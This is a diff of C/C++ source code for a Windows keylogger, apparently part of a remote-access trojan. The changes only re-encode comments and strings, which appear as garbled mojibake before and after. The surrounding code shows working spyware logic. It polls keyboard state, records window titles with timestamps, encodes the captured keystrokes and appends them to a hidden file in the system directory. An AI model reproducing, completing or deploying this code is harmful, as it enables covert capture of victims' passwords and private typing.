@@ -1,4 +1,4 @@
-ï»¿
+
 extern MODIFY_DATA modify_data;
 void SaveToFile(CHAR *lpBuffer)
 {
@@ -7,8 +7,8 @@ void SaveToFile(CHAR *lpBuffer)
 	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
 
 
-	//éšæœº
-	char	*lpTime = modify_data.szGroup/*(char *)FindConfigString(CKeyboardManager::g_hInstance, "XXXXXX")*/;//é˜²æ­¢åˆ†ç»„å’Œåˆ«äººé‡å¤
+	//Ëæ»ú
+	char	*lpTime = modify_data.szGroup/*(char *)FindConfigString(CKeyboardManager::g_hInstance, "XXXXXX")*/;//·ÀÖ¹·Ö×éºÍ±ğÈËÖØ¸´
 //	lpTime=lpTime+6;
 	strcat(strRecordFile,"\\");
 	strcat(strRecordFile,(char *)lpTime);
@@ -21,7 +21,7 @@ void SaveToFile(CHAR *lpBuffer)
 	DWORD dwSize = GetFileSize(hFile, NULL);
 	if (dwSize < 1024 * 1024 * 50)
 		SetFilePointer(hFile, 0, 0, FILE_END);
-	// åŠ å¯†
+	// ¼ÓÃÜ
 	int	nLength = lstrlen(lpBuffer);
 	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
 	for (int i = 0; i < nLength; i++)
@@ -97,7 +97,7 @@ char *LowerCase[]={
 		"\\",
 		"[CTRL]",
 		"[WIN]",
-		"[ç©ºæ ¼]",
+		"[¿Õ¸ñ]",
 		"[WIN]",
 		"[Print Screen]",
 		"[Scroll Lock]",
@@ -201,10 +201,10 @@ char *UpperCase[]={
 		"<",   //60
 		">",
 		"?",
-		"â”‚",
+		"©¦",
 		"[CTRL]",
 		"[WIN]",
-		"[ç©ºæ ¼]",
+		"[¿Õ¸ñ]",
 		"[WIN]",
 		"[Print Screen]",
 		"[Scroll Lock]",
@@ -346,7 +346,7 @@ int SpecialKeys[]={
 		12,   //99
 		18,   //100 
 		16,   //101
-		19,   //102  //å› ä¸ºå°‘äº†æœ€å‰é¢çš„ä¸€ä¸ª æ‰€ä»¥æ˜¯101
+		19,   //102  //ÒòÎªÉÙÁË×îÇ°ÃæµÄÒ»¸ö ËùÒÔÊÇ101
 };
 
 HWND PreviousFocus=NULL;
@@ -376,7 +376,7 @@ BOOL IsWindowsFocusChange()
 		{
 			SYSTEMTIME   s;  
 			GetLocalTime(&s);  
-			wsprintf(temp,"\r\n[æ ‡é¢˜:]%s\r\n[æ—¶é—´:]%d-%d-%d  %d:%d:%d\r\n",WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
+			wsprintf(temp,"\r\n[±êÌâ:]%s\r\n[Ê±¼ä:]%d-%d-%d  %d:%d:%d\r\n",WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
 			SaveToFile(temp);
 			memset(temp,0,sizeof(temp));
 			memset(WindowCaption,0,sizeof(WindowCaption)); 
@@ -387,7 +387,7 @@ BOOL IsWindowsFocusChange()
 	return ReturnFlag; 
 }
 
-//å®šä¹‰ä¸€ä¸ªå˜é‡ é˜²æ­¢é”®ç›˜è®°å½•å¼€å¯2ä¸ªç›‘å¬çº¿ç¨‹
+//¶¨ÒåÒ»¸ö±äÁ¿ ·ÀÖ¹¼üÅÌ¼ÇÂ¼¿ªÆô2¸ö¼àÌıÏß³Ì
 
 BOOL KeyStary = TRUE;
 
@@ -416,14 +416,14 @@ DWORD WINAPI KeyLogger(LPARAM lparam)
 			if (IsWindowsFocusChange())
 			{
 			//	lstrcat(KeyBuffer,"\r\n");
-			//	lstrcat(KeyBuffer,"\n"); //æ³¨é‡Šæ‰è§£å†³å¤åˆ¶ç²˜è´´ä¹±ç 
-				SaveToFile("[å†…å®¹:]");
+			//	lstrcat(KeyBuffer,"\n"); //×¢ÊÍµô½â¾ö¸´ÖÆÕ³ÌùÂÒÂë
+				SaveToFile("[ÄÚÈİ:]");
 				SaveToFile(KeyBuffer);
 				memset(KeyBuffer,0,sizeof(KeyBuffer));
 			}
 			else
 			{
-			//	lstrcat(KeyBuffer,"\n");//æ³¨é‡Šæ‰è§£å†³å¤åˆ¶ç²˜è´´ä¹±ç 
+			//	lstrcat(KeyBuffer,"\n");//×¢ÊÍµô½â¾ö¸´ÖÆÕ³ÌùÂÒÂë
 				SaveToFile(KeyBuffer);
 				memset(KeyBuffer,0,sizeof(KeyBuffer));
 
@@ -461,7 +461,7 @@ DWORD WINAPI KeyLogger(LPARAM lparam)
 				{
 					state = bKstate[x]; 
 					bKstate[x] = 0;
-					if (x == 8) //é€€é”®
+					if (x == 8) //ÍË¼ü
 					{
 // 						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
 // 						continue;
@@ -479,13 +479,13 @@ DWORD WINAPI KeyLogger(LPARAM lparam)
 							continue;
 						}
 						else
-							if (x == 13) //å›è½¦
+							if (x == 13) //»Ø³µ
 							{
 								/*if (lstrlen(KeyBuffer) == 0) 
 								{
 									continue; 
-								}*///ä¸å»æ‰çš„è¯ Enteræ— æ³•è®°å½•
-								lstrcat(KeyBuffer,"<Enter>\r\n");//è‡ªåŠ¨æ¢è¡Œ
+								}*///²»È¥µôµÄ»° EnterÎŞ·¨¼ÇÂ¼
+								lstrcat(KeyBuffer,"<Enter>\r\n");//×Ô¶¯»»ĞĞ
 								SaveToFile(KeyBuffer);
 								memset(KeyBuffer,0,sizeof(KeyBuffer)); 
 								continue; 
